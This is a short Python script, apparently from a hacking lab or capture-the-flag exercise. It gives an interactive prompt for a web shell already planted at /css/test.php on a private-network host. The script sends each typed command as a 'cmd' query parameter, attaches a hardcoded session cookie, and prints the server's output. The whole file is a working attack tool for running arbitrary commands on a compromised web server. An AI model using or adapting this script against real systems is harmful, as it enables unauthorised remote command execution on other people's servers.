#!/usr/bin/python3

import requests, sys, os, re

url_target = "http://192.168.0.102"
cookie= {
	"PHPSESSID":"av7pe61tqptlm6sugp6mamc2s5"
}

def shell():

	shell_url = url_target + "/css/test.php"
	while True:
		cmd=input("web@shell$ ")

		if cmd == "exit":
			print("\n[!] Saliendo...\n")
			sys.exit(1)
		else:
			url = shell_url + "?cmd={}".format(cmd)
			s = requests.get(url, cookies = cookie).text

			s1 = re.sub(r'^1.*',"",s)
			s2 =re.sub(r'4$',"",s1)
			print(s2)

shell()
